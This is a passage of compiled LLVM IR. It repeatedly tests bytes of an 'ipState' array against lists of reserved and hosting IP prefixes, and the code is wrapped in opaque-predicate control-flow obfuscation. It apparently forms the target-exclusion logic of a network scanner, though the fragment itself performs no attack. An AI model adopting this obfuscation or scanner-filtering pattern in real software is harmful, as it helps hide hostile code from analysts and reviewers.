  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %151, label %1160, label %160

; <label>:160:                                    ; preds = %originalBBpart212, %originalBBpart28, %116
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 192
  br i1 %163, label %164, label %188

; <label>:164:                                    ; preds = %160
  %165 = load i32, i32* @x.51
  %166 = load i32, i32* @y.52
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %164
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 88
  %176 = load i32, i32* @x.51
  %177 = load i32, i32* @y.52
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %175, label %184, label %188

; <label>:184:                                    ; preds = %originalBBpart216
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 99
  br i1 %187, label %1160, label %188

; <label>:188:                                    ; preds = %184, %originalBBpart216, %160
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 192
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %188
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 168
  br i1 %195, label %1160, label %196

; <label>:196:                                    ; preds = %192, %188
  %197 = load i32, i32* @x.51
  %198 = load i32, i32* @y.52
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %196
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 198
  %208 = load i32, i32* @x.51
  %209 = load i32, i32* @y.52
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %207, label %216, label %224

; <label>:216:                                    ; preds = %originalBBpart220
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 18
  br i1 %219, label %1160, label %220

; <label>:220:                                    ; preds = %216
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 19
  br i1 %223, label %1160, label %224

; <label>:224:                                    ; preds = %220, %originalBBpart220
  %225 = load i32, i32* @x.51
  %226 = load i32, i32* @y.52
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %224
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 198
  %236 = load i32, i32* @x.51
  %237 = load i32, i32* @y.52
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %235, label %244, label %268

; <label>:244:                                    ; preds = %originalBBpart224
  %245 = load i32, i32* @x.51
  %246 = load i32, i32* @y.52
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %244
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 51
  %256 = load i32, i32* @x.51
  %257 = load i32, i32* @y.52
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %255, label %264, label %268

; <label>:264:                                    ; preds = %originalBBpart228
  %265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 100
  br i1 %267, label %1160, label %268

; <label>:268:                                    ; preds = %264, %originalBBpart228, %originalBBpart224
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 203
  br i1 %271, label %272, label %296

; <label>:272:                                    ; preds = %268
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 0
  br i1 %275, label %276, label %296

; <label>:276:                                    ; preds = %272
  %277 = load i32, i32* @x.51
  %278 = load i32, i32* @y.52
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %276
  %285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 113
  %288 = load i32, i32* @x.51
  %289 = load i32, i32* @y.52
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %287, label %1160, label %296

; <label>:296:                                    ; preds = %originalBBpart232, %272, %268
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 188
  br i1 %299, label %300, label %308

; <label>:300:                                    ; preds = %296
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 209
  br i1 %303, label %304, label %308

; <label>:304:                                    ; preds = %300
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 52
  br i1 %307, label %1160, label %308

; <label>:308:                                    ; preds = %304, %300, %296
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 188
  br i1 %311, label %312, label %336

; <label>:312:                                    ; preds = %308
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 209
  br i1 %315, label %316, label %336

; <label>:316:                                    ; preds = %312
  %317 = load i32, i32* @x.51
  %318 = load i32, i32* @y.52
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %316
  %325 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 49
  %328 = load i32, i32* @x.51
  %329 = load i32, i32* @y.52
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %327, label %1160, label %336

; <label>:336:                                    ; preds = %originalBBpart236, %312, %308
  %337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 185
  br i1 %339, label %340, label %364

; <label>:340:                                    ; preds = %336
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 62
  br i1 %343, label %344, label %364

; <label>:344:                                    ; preds = %340
  %345 = load i32, i32* @x.51
  %346 = load i32, i32* @y.52
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %344
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 190
  %356 = load i32, i32* @x.51
  %357 = load i32, i32* @y.52
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %355, label %1160, label %364

; <label>:364:                                    ; preds = %originalBBpart240, %340, %336
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 185
  br i1 %367, label %368, label %392

; <label>:368:                                    ; preds = %364
  %369 = load i32, i32* @x.51
  %370 = load i32, i32* @y.52
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %368
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 62
  %380 = load i32, i32* @x.51
  %381 = load i32, i32* @y.52
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %379, label %388, label %392

; <label>:388:                                    ; preds = %originalBBpart244
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 189
  br i1 %391, label %1160, label %392

; <label>:392:                                    ; preds = %388, %originalBBpart244, %364
  %393 = load i32, i32* @x.51
  %394 = load i32, i32* @y.52
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %392
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %402 = zext i8 %401 to i32
  %403 = icmp eq i32 %402, 185
  %404 = load i32, i32* @x.51
  %405 = load i32, i32* @y.52
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %403, label %412, label %436

; <label>:412:                                    ; preds = %originalBBpart248
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 62
  br i1 %415, label %416, label %436

; <label>:416:                                    ; preds = %412
  %417 = load i32, i32* @x.51
  %418 = load i32, i32* @y.52
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %416
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 188
  %428 = load i32, i32* @x.51
  %429 = load i32, i32* @y.52
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %427, label %1160, label %436

; <label>:436:                                    ; preds = %originalBBpart252, %412, %originalBBpart248
  %437 = load i32, i32* @x.51
  %438 = load i32, i32* @y.52
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %436
  %445 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 185
  %448 = load i32, i32* @x.51
  %449 = load i32, i32* @y.52
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %447, label %456, label %480

; <label>:456:                                    ; preds = %originalBBpart256
  %457 = load i32, i32* @x.51
  %458 = load i32, i32* @y.52
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %456
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 61
  %468 = load i32, i32* @x.51
  %469 = load i32, i32* @y.52
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %467, label %476, label %480

; <label>:476:                                    ; preds = %originalBBpart260
  %477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %478 = zext i8 %477 to i32
  %479 = icmp eq i32 %478, 137
  br i1 %479, label %1160, label %480

; <label>:480:                                    ; preds = %476, %originalBBpart260, %originalBBpart256
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 185
  br i1 %483, label %484, label %492

; <label>:484:                                    ; preds = %480
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 61
  br i1 %487, label %488, label %492

; <label>:488:                                    ; preds = %484
  %489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 136
  br i1 %491, label %1160, label %492

; <label>:492:                                    ; preds = %488, %484, %480
  %493 = load i32, i32* @x.51
  %494 = load i32, i32* @y.52
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %492
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %502 = zext i8 %501 to i32
  %503 = icmp eq i32 %502, 185
  %504 = load i32, i32* @x.51
  %505 = load i32, i32* @y.52
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %503, label %512, label %552

; <label>:512:                                    ; preds = %originalBBpart264
  %513 = load i32, i32* @x.51
  %514 = load i32, i32* @y.52
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %512
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 11
  %524 = load i32, i32* @x.51
  %525 = load i32, i32* @y.52
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %523, label %532, label %552

; <label>:532:                                    ; preds = %originalBBpart268
  %533 = load i32, i32* @x.51
  %534 = load i32, i32* @y.52
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %532
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %542 = zext i8 %541 to i32
  %543 = icmp eq i32 %542, 147
  %544 = load i32, i32* @x.51
  %545 = load i32, i32* @y.52
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %543, label %1160, label %552

; <label>:552:                                    ; preds = %originalBBpart272, %originalBBpart268, %originalBBpart264
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %554 = zext i8 %553 to i32
  %555 = icmp eq i32 %554, 185
  br i1 %555, label %556, label %564

; <label>:556:                                    ; preds = %552
  %557 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %558 = zext i8 %557 to i32
  %559 = icmp eq i32 %558, 11
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %556
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = icmp eq i32 %562, 146
  br i1 %563, label %1160, label %564

; <label>:564:                                    ; preds = %560, %556, %552
  %565 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %566 = zext i8 %565 to i32
  %567 = icmp eq i32 %566, 185
  br i1 %567, label %568, label %576

; <label>:568:                                    ; preds = %564
  %569 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %570 = zext i8 %569 to i32
  %571 = icmp eq i32 %570, 11
  br i1 %571, label %572, label %576

; <label>:572:                                    ; preds = %568
  %573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %574 = zext i8 %573 to i32
  %575 = icmp eq i32 %574, 145
  br i1 %575, label %1160, label %576

; <label>:576:                                    ; preds = %572, %568, %564
  %577 = load i32, i32* @x.51
  %578 = load i32, i32* @y.52
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %576
  %585 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %586 = zext i8 %585 to i32
  %587 = icmp eq i32 %586, 63
  %588 = load i32, i32* @x.51
  %589 = load i32, i32* @y.52
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %587, label %596, label %620

; <label>:596:                                    ; preds = %originalBBpart276
  %597 = load i32, i32* @x.51
  %598 = load i32, i32* @y.52
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %596
  %605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %606 = zext i8 %605 to i32
  %607 = icmp eq i32 %606, 141
  %608 = load i32, i32* @x.51
  %609 = load i32, i32* @y.52
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %607, label %616, label %620

; <label>:616:                                    ; preds = %originalBBpart280
  %617 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %618 = zext i8 %617 to i32
  %619 = icmp eq i32 %618, 241
  br i1 %619, label %1160, label %620

; <label>:620:                                    ; preds = %616, %originalBBpart280, %originalBBpart276
  %621 = load i32, i32* @x.51
  %622 = load i32, i32* @y.52
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %620
  %629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %630 = zext i8 %629 to i32
  %631 = icmp eq i32 %630, 69
  %632 = load i32, i32* @x.51
  %633 = load i32, i32* @y.52
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %631, label %640, label %648

; <label>:640:                                    ; preds = %originalBBpart284
  %641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %642 = zext i8 %641 to i32
  %643 = icmp eq i32 %642, 30
  br i1 %643, label %644, label %648

; <label>:644:                                    ; preds = %640
  %645 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %646 = zext i8 %645 to i32
  %647 = icmp eq i32 %646, 192
  br i1 %647, label %1160, label %648

; <label>:648:                                    ; preds = %644, %640, %originalBBpart284
  %649 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %650 = zext i8 %649 to i32
  %651 = icmp eq i32 %650, 69
  br i1 %651, label %652, label %676

; <label>:652:                                    ; preds = %648
  %653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %654 = zext i8 %653 to i32
  %655 = icmp eq i32 %654, 30
  br i1 %655, label %656, label %676

; <label>:656:                                    ; preds = %652
  %657 = load i32, i32* @x.51
  %658 = load i32, i32* @y.52
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %656
  %665 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %666 = zext i8 %665 to i32
  %667 = icmp eq i32 %666, 244
  %668 = load i32, i32* @x.51
  %669 = load i32, i32* @y.52
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %667, label %1160, label %676

; <label>:676:                                    ; preds = %originalBBpart288, %652, %648
  %677 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %678 = zext i8 %677 to i32
  %679 = icmp eq i32 %678, 69
  br i1 %679, label %680, label %720

; <label>:680:                                    ; preds = %676
  %681 = load i32, i32* @x.51
  %682 = load i32, i32* @y.52
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %680
  %689 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %690 = zext i8 %689 to i32
  %691 = icmp eq i32 %690, 197
  %692 = load i32, i32* @x.51
  %693 = load i32, i32* @y.52
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
